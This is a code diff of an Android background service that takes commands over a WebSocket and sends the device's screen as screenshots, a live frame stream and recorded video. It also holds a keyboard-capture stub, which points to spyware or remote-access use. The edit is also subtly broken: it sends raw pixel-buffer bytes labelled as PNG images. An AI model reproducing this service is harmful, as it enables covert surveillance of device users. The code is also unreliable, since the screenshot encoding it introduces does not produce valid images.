@@ -173,7 +173,7 @@ public class WebSocketService extends Service {
                 startVideoRecording();
                 break;
             case "keyboard":
-                writeLog("Запись клавиатуры (заглушка)");
+                writeLog("Клавиатура (заглушка)");
                 break;
             case "app":
                 openApp(params != null ? params.optString("package") : null);
@@ -242,14 +242,9 @@ public class WebSocketService extends Service {
                 ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                 byte[] bytes = new byte[buffer.remaining()];
                 buffer.get(bytes);
-                Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
-                if (bitmap != null) {
-                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                    bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
-                    String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
-                    client.send("{\"type\":\"stream_frame\",\"image\":\"" + base64 + "\"}");
-                    writeLog("Кадр стрима отправлен");
-                }
+                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                client.send("{\"type\":\"stream_frame\",\"image\":\"" + base64 + "\"}");
+                writeLog("Кадр стрима отправлен");
                 image.close();
             }
             if (virtualDisplay != null) virtualDisplay.release();
@@ -274,15 +269,12 @@ public class WebSocketService extends Service {
                 ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                 byte[] bytes = new byte[buffer.remaining()];
                 buffer.get(bytes);
-                Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
-                if (bitmap != null) {
-                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
-                    String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
-                    client.send("{\"type\":\"screenshot\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
-                    writeLog("Скриншот отправлен");
-                }
+                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                client.send("{\"type\":\"screenshot\",\"image\":\"data:image/png;base64," + base64 + "\"}");
+                writeLog("Скриншот отправлен");
                 image.close();
+            } else {
+                writeLog("Не удалось получить изображение (image == null)");
             }
             if (virtualDisplay != null) virtualDisplay.release();
             if (imageReader != null) imageReader.close();
@@ -317,18 +309,15 @@ public class WebSocketService extends Service {
                     720, 1280, 240,
                     DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                     mediaRecorder.getSurface(), null, null);
-            // сохраняем в поле, чтобы потом закрыть
             mediaRecorder.start();
             writeLog("Видеозапись начата, файл: " + videoFilePath);
 
-            // Остановить через 30 секунд (можно продлить)
             handler.postDelayed(() -> {
                 try {
                     mediaRecorder.stop();
                     mediaRecorder.release();
                     mediaRecorder = null;
                     writeLog("Видео остановлено, файл: " + videoFilePath);
-                    // Можно отправить на сервер, но пока сохраняем локально
                 } catch (Exception e) {
                     writeLog("Ошибка остановки видео: " + e.toString());
                 }
